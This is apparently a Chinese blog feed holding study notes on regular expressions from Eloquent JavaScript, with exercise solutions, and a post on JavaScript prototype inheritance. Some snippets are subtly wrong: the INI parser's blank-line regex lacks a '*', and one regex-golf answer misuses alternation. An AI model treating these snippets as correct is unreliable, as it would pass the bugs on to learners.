<p>全局选项另一个有趣的效果就是它改变了<code>match</code>方法在字符串上的工作方式。当用一个全局正则表达式调用时，代替返回一个类似于从<code>exec</code>方法返回的数组，<code>match</code>将找到所有字符串中的模式匹配并返回一个包含匹配字符串的数组。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"Banana"</span>.match(<span class="regexp">/an/g</span>))</span><br></pre></td></tr></table></figure>
<p>所以对于全局正则表达式要格外小心。调用<code>replace</code>和你想要明确使用<code>lastIndex</code>的时候，是典型的唯一的你需要使用全局选项的地方。</p>
<h2 id="在匹配上循环"><a href="#在匹配上循环" class="headerlink" title="在匹配上循环"></a>在匹配上循环</h2><p>扫描字符串中所有模式的出现是很常做的一件事，以在循环体中获取到匹配对象的方式实现。我们可以使用<code>lastIndex</code>和<code>exec</code>来实现。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> input = <span class="string">"A string with 3 numbers in it... 42 and 88."</span>;</span><br><span class="line"><span class="keyword">let</span> number = <span class="regexp">/\b\d+\b/g</span>;</span><br><span class="line"><span class="keyword">let</span> match;</span><br><span class="line"><span class="keyword">while</span> (match = number.exec(input)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Found"</span>, match[<span class="number">0</span>], <span class="string">"at"</span>, match.index);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// → Found 3 at 14</span></span><br><span class="line"><span class="comment">//   Found 42 at 33</span></span><br><span class="line"><span class="comment">//   Found 88 at 40</span></span><br></pre></td></tr></table></figure>

<p>这利用了赋值表达式的值就是被赋的值的事实。所以通过使用<code>match = number.exec(input)</code>作为<code>while</code>循环的条件，我们从每次迭代开始执行匹配，将结果存放到一个绑定中，并在没有多余匹配的时候停止循环。</p>
<h2 id="解析一个ini文件"><a href="#解析一个ini文件" class="headerlink" title="解析一个ini文件"></a>解析一个ini文件</h2><p>为了结束这个章节，我们将研究一个需要正则表达式的问题。假设我们正在写一个程序去自动收集关于互联网上我们敌人的信息。（我们实际上不会在这里写这个程序，仅仅是读取配置文件的部分）。配置文件看起来像这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchengine&#x3D;https:&#x2F;&#x2F;duckduckgo.com&#x2F;?q&#x3D;$1</span><br><span class="line">spitefulness&#x3D;9.7</span><br><span class="line"></span><br><span class="line">; comments are preceded by a semicolon...</span><br><span class="line">; each section concerns an individual enemy</span><br><span class="line">[larry]</span><br><span class="line">fullname&#x3D;Larry Doe</span><br><span class="line">type&#x3D;kindergarten bully</span><br><span class="line">website&#x3D;http:&#x2F;&#x2F;www.geocities.com&#x2F;CapeCanaveral&#x2F;11451</span><br><span class="line"></span><br><span class="line">[davaeorn]</span><br><span class="line">fullname&#x3D;Davaeorn</span><br><span class="line">type&#x3D;evil wizard</span><br><span class="line">outputdir&#x3D;&#x2F;home&#x2F;marijn&#x2F;enemies&#x2F;davaeorn</span><br></pre></td></tr></table></figure>

<p>这个格式（广泛被使用，通常叫做INI文件）的规则如下：</p>
<ul>
<li>空行和开始于分号的行被忽略</li>
<li>包裹在[]内的行开始一个新的section</li>
<li>包含数字字母的标识符后面跟着一个等号字符为当前section添加一个设定</li>
<li>任何其他东西都不合法<br>我们的任务是转换这样的字符串到一个对象，其属性包含在第一个section头之前的设定字符串和section的子对象，这些子对象包含section的设定。</li>
</ul>
<p>因为这个格式必须一行挨一行的处理，将整个文件分隔为独立的行是一个好的开端。我们在第四章见过split方法。一些操作系统不使用换行符去分隔行，而是用回车换行字符（”\r\n”)。<code>split</code>方法也能接受一个正则表达式，我们就可以使用像<code>/\r?\n/</code>去分隔行，并同时允许两种换行方式的存在。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseINI</span>(<span class="params">string</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> result = &#123;&#125;;</span><br><span class="line">    <span class="keyword">let</span> section = result;</span><br><span class="line">    string.split(<span class="regexp">/\r?\n/</span>).forEach(<span class="function"><span class="params">line</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> match;</span><br><span class="line">        <span class="keyword">if</span>(match = line.match(<span class="regexp">/^(\w+)=(.*)$/</span>)) &#123;</span><br><span class="line">            section[match[<span class="number">1</span>]] = match[<span class="number">2</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (match = line.match(<span class="regexp">/^\[(.*)\]$/</span>)) &#123;</span><br><span class="line">            section = result[match[<span class="number">1</span>]] = &#123;&#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="regexp">/^\s(;.*)?$/</span>.test(line)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Line '"</span> + line + <span class="string">"' is not valid."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(parseINI(<span class="string">`</span></span><br><span class="line"><span class="string">name=Vasilis</span></span><br><span class="line"><span class="string">[address]</span></span><br><span class="line"><span class="string">city=Tessaloniki`</span>));</span><br><span class="line"><span class="comment">// → &#123;name: "Vasilis", address: &#123;city: "Tessaloniki"&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>代码遍历文件的行然后构建一个对象。顶部属性直接存储在对象中，而section中的属性存储在独立的section对象中。<code>section</code>绑定指向当前section对象。</p>
<p>有两种值得注意的行，section头部或者属性行。当某行是一个常规的属性，就被存储在当前的section。当它是一个section头时，一个新的section对象被创建，并且<code>section</code>被设置为指向它。</p>
<p>注意反复使用的<code>^</code>和<code>$</code>是为了确保整行匹配而不是部分匹配。如果不考虑这些问题，代码的大部分能够正常工作，但是对于某些输入也许会表现得不正常，可能是一个很难追踪的bug。</p>
<p>模式<code>if(match = string.match(...))</code>类似于在<code>while</code>循环条件中使用赋值的小窍门。你经常不确定对<code>match</code>的调用是否成功，所以可以在if语句中获取结果对象来测试。为了不打破<code>else if</code>的链式形式，我们将匹配的结果赋给一个绑定，然后立刻使用那个赋值作为if的判定条件。</p>
<p>如果一行不是一个section的头或者一个属性，函数用<code>/^\s*(;.*)?$</code>来检查是否是一行注释或者一个空行。你发现它是如何工作的了么？在圆括号中间的部分匹配注释，而<code>?</code>确保它也可以匹配只包含空白字符的行。当某行不匹配任何期望的形式，函数抛出异常。</p>
<h2 id="国际化字符"><a href="#国际化字符" class="headerlink" title="国际化字符"></a>国际化字符</h2><p>由于JS最初的简化实现以及这种简化实现后来被固定为标准行为的事实，JS的正则表达式对于非英语字符表现得相当愚蠢。例如，就JS的正则表达式而言，一个单词字符仅仅包含拉丁字母表中的26个英文字母（大写或小写），数字和下划线（由于某些原因）。类似于é和β，绝对是单词字符，但是不匹配<code>\w</code>（将匹配<code>\W</code>，非单词字符分类）。</p>
<p>一个奇怪的历史巧合，<code>\s</code>（空白字符）没有这个问题并且匹配Unicode标准中认为是空白字符的所有字符，包括像不间断空格（nonbreaking space）和蒙古语元音分隔符（Mongolian vowel separator）这样的字符。</p>
<p>另一个问题是，默认地，正则表达式处理代码单元，如同第五章讨论的那样，并不是实际的字符。这意味着由两个代码单元构成的字符表现得很奇怪。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/🍎&#123;3&#125;/</span>.test(<span class="string">"🍎🍎🍎"</span>));</span><br><span class="line"><span class="comment">// → false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/&lt;.&gt;/</span>.test(<span class="string">"&lt;🌹&gt;"</span>));</span><br><span class="line"><span class="comment">// → false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/&lt;.&gt;/u</span>.test(<span class="string">"&lt;🌹&gt;"</span>));</span><br><span class="line"><span class="comment">// → true</span></span><br></pre></td></tr></table></figure>
<p>问题是第一行的🍎被认为是两个代码单元，<code>{3}</code>部分只应用到第二个苹果。相似地，点操作符只匹配一个胆码单元，并非组成玫瑰emoji的两个代码单元。</p>
<p>你必须为你的正则表达式添加一个<code>u</code>选项（Unicode）使得他正确地对待这些字符。不幸的是错误的行为保持和从前一样，因为改变这个会导致依赖它的代码出现问题。</p>
<p>虽然这只是标准化的并且在写作本文的时候，还没有广泛地被支持，在正则表达式中使用<code>\p</code>（必须开启unicode选项）去匹配Unicode标准分配一个给定属性(property)的所有字符。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/\p&#123;Script=Greek&#125;/u</span>.test(<span class="string">"α"</span>));</span><br><span class="line"><span class="comment">// -&gt; true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/\p&#123;Script=Arabic&#125;/u</span>.test(<span class="string">"α"</span>));</span><br><span class="line"><span class="comment">// -&gt; false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/\p&#123;Alphabetic&#125;/u</span>.test(<span class="string">"α"</span>));</span><br><span class="line"><span class="comment">// -&gt; true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="regexp">/\p&#123;Alphabetic&#125;/u</span>.test(<span class="string">"!"</span>));</span><br><span class="line"><span class="comment">// -&gt; false</span></span><br></pre></td></tr></table></figure>
<p>Unicode定义了一些有用的属性（property），即使发现一个你需要使用的可能不总是容易的。你可以使用<code>\p{Property=Value}</code>标记来匹配对于这个属性这个值的任何字符。如果属性名没给定，如<code>\p{name}</code>，名字被假定为要么是一个二进制（binary）属性如<code>Alphabetic</code>或者一个分类如<code>Number</code>。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>正则表达式就是表示字符串中模式的对象。它们使用自己的语言表达这些模式。</p>
<ul>
<li><code>/abc/</code>: 一个字符序列</li>
<li><code>/[abc]/</code>: 从一组字符中选择一个字符</li>
<li><code>/[^abc]/</code>: 任何不再字符集合中的字符</li>
<li><code>[0-9]</code>: 任何在字符范围中的字符</li>
<li><code>/x+/</code>: 模式x一次或者多次出现</li>
<li><code>/x+?/</code>: 非贪婪地匹配一次或者多次出现</li>
<li><code>/x*/</code>: 0次或多次出现</li>
<li><code>/x?/</code>: 0次或1次出现</li>
<li><code>/x{2, 4}/</code>: 2到4次出现</li>
<li><code>/(abc)/</code>: 一组</li>
<li><code>/a|b|c/</code>: 几个模式中任何一个</li>
<li><code>/\d/</code>: 任何数字字符</li>
<li><code>/\w/</code>: 一个字母数字字符（单词字符）</li>
<li><code>/\s/</code>: 任何空白字符</li>
<li><code>/./</code>: 除了换行符之外的任意字符</li>
<li><code>/\b/</code>: 一个单词边界</li>
<li><code>/^/</code>: 输入的起始</li>
<li><code>/$/</code>: 输入的终止</li>
</ul>
<p>正则表达式有一个<code>test</code>方法去测试是否一个给定的字符串匹配它。它也有一个<code>exec</code>方法，当匹配发生的时候，返回一个包含所有匹配的组的数组。这样的数组有一个<code>index</code>属性，表明匹配开始的地方。</p>
<p>字符串有一个<code>match</code>方法去将他们和正则表达式匹配，还有一个<code>search</code>方法去搜索一个匹配，并只返回匹配开始的位置。它们的<code>replace</code>方法可以用一个替代字符串或一个函数来代替匹配到的模式。</p>
<p>正则表达式可以有选项，在闭合正斜线后书写。<code>i</code>选项让匹配不区分大小写。<code>g</code>选项使得表达式进行全局匹配，对于字符串的<code>replace</code>方法使得它替换掉所有匹配的字符串。<code>y</code>选项使得它成为粘性的，意味着当寻找匹配时不会向前搜索并且跳过字符串的一部分。<code>u</code>选项开启<code>Unicode</code>模式，在处理占据两个代码单元的字符上，修复了一系列问题。</p>
<p>正则表达式是一种难于对付的锐利工具。它们极大简化了某些任务但是被应用到复杂问题时很快就变得难以管理。知晓如何使用它们的一部分就是抵制硬塞进它们不能清楚表达的东西的冲动。</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>不可避免地在做这些练习的时候，你会感觉困惑和沮丧，因为一些正则表达式令人费解的行为。有时将表达式输入一个类似 <a href="https://debuggex.com" target="_blank" rel="noopener">https://debuggex.com</a> 的在线工具去观察是否可视化对应你所期望的那样并且尝试它对各种输入字符串的响应方式是有帮助的。</p>
<h3 id="正则高尔夫"><a href="#正则高尔夫" class="headerlink" title="正则高尔夫"></a>正则高尔夫</h3><p><em>Code golf</em>是尽可能少的使用字符来表达一个特定的程序的的游戏的术语。相似地，<em>regexp golf</em>就是练习写尽可能小的正则表达式去匹配一个给定的模式，并只匹配那个模式。</p>
<p>对于下面每一个条目，写一个正则表达式去测试是否任何给定的子串在一个字符串中。正则表达式应该只匹配描述的子串之一。除非明确指定否则不要担心单词边界。当你的表达式工作的时候，看看是否能使得它变得更简洁。</p>
<ol>
<li><p>car and cat</p>
</li>
<li><p>pop and prop</p>
</li>
<li><p>ferret, ferry, and ferrari</p>
</li>
<li><p>Any word ending in ious</p>
</li>
<li><p>A whitespace character followed by a period, comma, colon, or semicolon</p>
</li>
<li><p>A word longer than six letters</p>
</li>
<li><p>A word without the letter e (or E)</p>
</li>
</ol>
<p>请参考章节总结。用一些测试字符串去测试每个答案。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Fill in the regular expressions</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 还可以写ca(r|t)</span></span><br><span class="line">verify(<span class="regexp">/ca[rt]/</span>,</span><br><span class="line">       [<span class="string">"my car"</span>, <span class="string">"bad cats"</span>],</span><br><span class="line">       [<span class="string">"camper"</span>, <span class="string">"high art"</span>]);</span><br><span class="line"></span><br><span class="line">verify(<span class="regexp">/pr?op/</span>,</span><br><span class="line">       [<span class="string">"pop culture"</span>, <span class="string">"mad props"</span>],</span><br><span class="line">       [<span class="string">"plop"</span>, <span class="string">"prrrop"</span>]);</span><br><span class="line"></span><br><span class="line">verify(<span class="regexp">/^ferr(et|y|ari)$/</span>,</span><br><span class="line">       [<span class="string">"ferret"</span>, <span class="string">"ferry"</span>, <span class="string">"ferrari"</span>],</span><br><span class="line">       [<span class="string">"ferrum"</span>, <span class="string">"transfer A"</span>]);</span><br><span class="line"></span><br><span class="line">verify(<span class="regexp">/ious\b/</span>,</span><br><span class="line">       [<span class="string">"how delicious"</span>, <span class="string">"spacious room"</span>],</span><br><span class="line">       [<span class="string">"ruinous"</span>, <span class="string">"consciousness"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 还可以写/\s[.,:;]/</span></span><br><span class="line">verify(<span class="regexp">/\s\.|,|:|;/</span>,</span><br><span class="line">       [<span class="string">"bad punctuation ."</span>],</span><br><span class="line">       [<span class="string">"escape the period"</span>]);</span><br><span class="line"></span><br><span class="line">verify(<span class="regexp">/\w&#123;7&#125;/</span>,</span><br><span class="line">       [<span class="string">"hottentottententen"</span>],</span><br><span class="line">       [<span class="string">"no"</span>, <span class="string">"hotten totten tenten"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任意单词都可以，限定一个单词边界然后必须是单词字符非e。</span></span><br><span class="line">verify(<span class="regexp">/\b[^\We]+\b/i</span>,</span><br><span class="line">       [<span class="string">"red platypus"</span>, <span class="string">"wobbling nest"</span>],</span><br><span class="line">       [<span class="string">"earth bed"</span>, <span class="string">"learning ape"</span>, <span class="string">"BEET"</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify</span>(<span class="params">regexp, yes, no</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Ignore unfinished exercises</span></span><br><span class="line">  <span class="keyword">if</span> (regexp.source == <span class="string">"..."</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> str <span class="keyword">of</span> yes) <span class="keyword">if</span> (!regexp.test(str)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Failure to match '<span class="subst">$&#123;str&#125;</span>'`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> str <span class="keyword">of</span> no) <span class="keyword">if</span> (regexp.test(str)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Unexpected match for '<span class="subst">$&#123;str&#125;</span>'`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="引用风格"><a href="#引用风格" class="headerlink" title="引用风格"></a>引用风格</h3><p>假设你写了一个故事，并自始至终使用单引号标记对话。现在你想用双引号替换掉所有的单引号，同时保留缩写在*aren’t`中的单引号。</p>
<p>考虑一个模式区分这两种引号使用并且精心制作一个对<code>replace</code>的调用来做合适的替换。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> text = <span class="string">"'I'm the cook,' he said, 'it's my job.'"</span>;</span><br><span class="line"><span class="comment">// Change this call.</span></span><br><span class="line"><span class="built_in">console</span>.log(text.replace(<span class="regexp">/(^|\W)'|'(\W|$)/g</span>, <span class="string">'$1"$2'</span>));</span><br><span class="line"><span class="comment">// → "I'm the cook," he said, "it's my job."</span></span><br></pre></td></tr></table></figure>

<p>这个题有点意思，记录下查看了solution之后的想法。首先我们分析这两种引号的差异，对于不需要做变化的引号，左右肯定都是单词字符，而对于需要替换的引号，肯定要么左边是非单词字符或者右边是非单词字符，或者位于起始和结束位置的引号。所以才有了上面的正则表达式。</p>
<h3 id="再一次数字"><a href="#再一次数字" class="headerlink" title="再一次数字"></a>再一次数字</h3><p>写一个只匹配JS风格的数字的表达式。在数字前必须支持可选的加号或者减号，小数点和指数记号（如5e-3或者1E10），在指数前面有一个可选的正负号。同时注意没有必要在小数点前或者后有数字，但是数字不能够只有一个点。也就是<code>.5</code>和<code>5.</code>是合法的JS数字，但是单独的点不是。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Fill in this regular expression.</span></span><br><span class="line"><span class="keyword">let</span> number = <span class="regexp">/^[+-]?(\d+(\.\d*)?|\.\d+)([eE][+-]?\d+)?$/</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tests:</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> str <span class="keyword">of</span> [<span class="string">"1"</span>, <span class="string">"-1"</span>, <span class="string">"+15"</span>, <span class="string">"1.55"</span>, <span class="string">".5"</span>, <span class="string">"5."</span>, <span class="string">"1.3e2"</span>, <span class="string">"1E-4"</span>, <span class="string">"1e+12"</span>]) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!number.test(str)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Failed to match '<span class="subst">$&#123;str&#125;</span>'`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> str <span class="keyword">of</span> [<span class="string">"1a"</span>, <span class="string">"+-1"</span>, <span class="string">"1.2.3"</span>, <span class="string">"1+1"</span>, <span class="string">"1e4.5"</span>, <span class="string">".5."</span>, <span class="string">"1f5"</span>, <span class="string">"."</span>]) &#123;</span><br><span class="line">  <span class="keyword">if</span> (number.test(str)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`Incorrectly accepted '<span class="subst">$&#123;str&#125;</span>'`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个模式感觉有点费解。正负号首先是可选的，然后e之前的部分，这部分允许我们是一个小数或者一个整数，小数可以以<code>.5</code>或者<code>5.</code>形式出现。那么我们这里对于符号自然是选择利用重复操作符，即可选操作符<code>?</code>。然后对于下面的部分就有意思了，我们将带有整数部分的小数和不带整数部分的小数分开来看。带有整数的小数需要整数部分必定大于等于1位，并且小数部分可选。对于不带整数部分的小数，小数部分至少一位。而后面的指数部分整体可选，采用<code>?</code>标识。而如果存在，则必然以e或者E开头，然后是可选的正负号，然后才是至少一位长的数字。</p>
]]></content>
      <categories>
        <category>Eloquent JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>JS中的继承</title>
    <url>/2019/01/27/JS%E4%B8%AD%E7%9A%84%E7%BB%A7%E6%89%BF/</url>
    <content><![CDATA[<h1 id="JS中的继承"><a href="#JS中的继承" class="headerlink" title="JS中的继承"></a>JS中的继承</h1><h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><p>提到继承，不得不说的是JS中的原型链概念。JS不像传统的面向对象语言，在ES6出现以前，JS标准中并没有类的概念，所以往往是通过原型链的特性实现面向对象的继承。看过一些资料以后，发现其实原型链的概念十分简单，一句话总结：JS中的每个对象都有一个<code>__proto__</code>属性，而这个属性指向它的构造函数的<code>prototype</code>属性，而因为函数在JS中也是对象，所以函数本身也有<code>__proto__</code>属性，而在对象上进行属性查找就会沿着这条链一直向上进行，直到原型链的终点<code>Object.prototype</code>（<code>Object.prototype.__proto__</code>属性为null）。还有一个重要的点是构造函数的<code>prototype</code>对象有一个<code>constructor</code>属性，这个属性指向构造函数本身，我们可以利用这个特性建立对象和其构造函数之间的联系，因为我们知道，对于<code>bar.constructor</code>属性的查找，如果<code>bar</code>本身没有<code>constructor</code>属性，就会在其<code>__proto__</code>属性上查找，而<code>__proto__</code>又指向其构造器的<code>prototype</code>，所以依据这个特性，就能找到某对象的构造函数。另外一个便捷的判断实例构造器的方法是利用<code>instanceof</code>操作符，这个操作符会沿着对象的原型链一直向上查找直到对象的<code>__proto__</code>的<code>__proto__</code>…等于函数的<code>prototype</code>属性，或是一直到<code>Object.prototype</code>都没有相等，返回<code>false</code>。</p>
<a id="more"></a>

<h2 id="实现继承"><a href="#实现继承" class="headerlink" title="实现继承"></a>实现继承</h2><p>因为我们要实现类的继承，这里定义父类为<code>Parent</code>，子类为<code>Child</code>，先看一下最基本实现继承的代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    Parent.call(<span class="keyword">this</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Child.prototype.__proto__ = Parent.prototype;</span><br></pre></td></tr></table></figure>

<p>实现继承分为两个步骤：</p>
<ul>
<li>在子类中调用父类的构造函数</li>
<li>建立原型链（继承链）</li>
</ul>
<p>JS中的每个函数都有一个<code>call</code>方法和一个<code>apply</code>方法，这两个方法的作用都是改变调用上下文<code>this</code>的指向，我们在子类中调用<code>Parent.call(this, name);</code>就是表明我们需要调用<code>Parent</code>这个函数，并且将<code>Parent</code>构造函数中的<code>this</code>设置为<code>Child</code>中的<code>this</code>，在通过<code>new</code>操作符实例化对象时，这个<code>this</code>表现为新创建的对象，借此就实现了在子类中调用父类的构造函数。<code>apply</code>方法也用于改变函数调用的上下文，只是传入的参数以数组方式体现。</p>
<p>我们知道，原型链的查找规则是先从对象本身开始，然后沿着<code>__proto__</code>一直向上。我们要将两个类链接起来，就需要在对象的<code>__proto__</code>上做调整，由于<code>__proto__</code>指向构造函数的<code>prototype</code>，所以我们设置子类的构造器的<code>prototype</code>，让其<code>__proto__</code>指向父类的<code>prototype</code>，当我们在当前实例对象或者其<code>__proto__</code>上查找不到要抄找的属性或方法时，就会去查找父类的构造函数的<code>prototype</code>，所以我们就建立了父类和字类之间的联系。</p>
<h2 id="Node-js中的继承"><a href="#Node-js中的继承" class="headerlink" title="Node.js中的继承"></a>Node.js中的继承</h2><p>Node.js中的<code>util</code>核心模块提供了一个<code>inherits</code>函数，这个函数封装了建立原型链的实现。传入的第一个参数为子类，传入的第二个参数为父类。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> inherits = <span class="built_in">require</span>(<span class="string">'util'</span>).inherits;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Parent.prototype.bar = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'我是父类的bar方法'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    Parent.call(<span class="keyword">this</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Child.prototype.foo = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'我是子类的foo方法'</span>);</span><br><span class="line"></span><br><span class="line">inherits(Child, Parent);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> child = <span class="keyword">new</span> Child(<span class="string">'ann'</span>);</span><br><span class="line"><span class="keyword">let</span> parent = <span class="keyword">new</span> Parent(<span class="string">'bob'</span>);</span><br><span class="line"></span><br><span class="line">child.foo(); <span class="comment">// 我是子类的foo方法</span></span><br><span class="line">child.bar(); <span class="comment">// 我是父类的bar方法</span></span><br></pre></td></tr></table></figure>

<p>因为<code>__proto__</code>不是JS标准的一部分，所以人为设置并不推荐。其实有一个<code>Object.create</code>方法用于根据一个对象来创造另一个对象，并且新对象的<code>__proto__</code>指向该方法传入的参数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> bar = <span class="built_in">Object</span>.create(foo);</span><br><span class="line"><span class="built_in">console</span>.log(bar.__proto__ === foo); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>所以上面的例子就可以改写成</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    Parent.call(<span class="keyword">this</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Child.prototype = <span class="built_in">Object</span>.create(Parent.prototype);</span><br></pre></td></tr></table></figure>

<p>但是这种方法相当于<code>Child.prototype = {__proto__: Parent.prototype}</code>，因此就会丢失<code>Child.prototype.constructor</code>属性，所以我们在<code>Object.create</code>还可以传入第二个参数，该参数为一个对象，表明创建的新对象需要额外添加的属性。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    Parent.call(<span class="keyword">this</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Child.prototype = <span class="built_in">Object</span>.create(Parent.prototype, &#123;</span><br><span class="line">    <span class="keyword">constructor</span>: &#123;</span><br><span class="line">        value: Child,</span><br><span class="line">        enumerable: <span class="literal">false</span>,</span><br><span class="line">        writable: <span class="literal">true</span>,</span><br><span class="line">        configurable: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>查看了一下最新的<code>nodejs</code>中<code>inherits</code>函数的实现，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inherits</span>(<span class="params">ctor, superCtor</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ctor === <span class="literal">undefined</span> || ctor === <span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ERR_INVALID_ARG_TYPE(<span class="string">'ctor'</span>, <span class="string">'Function'</span>, ctor);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (superCtor === <span class="literal">undefined</span> || superCtor === <span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ERR_INVALID_ARG_TYPE(<span class="string">'superCtor'</span>, <span class="string">'Function'</span>, superCtor);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (superCtor.prototype === <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ERR_INVALID_ARG_TYPE(<span class="string">'superCtor.prototype'</span>,</span><br><span class="line">                                   <span class="string">'Object'</span>, superCtor.prototype);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(ctor, <span class="string">'super_'</span>, &#123;</span><br><span class="line">    value: superCtor,</span><br><span class="line">    writable: <span class="literal">true</span>,</span><br><span class="line">    configurable: <span class="literal">true</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="built_in">Object</span>.setPrototypeOf(ctor.prototype, superCtor.prototype);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
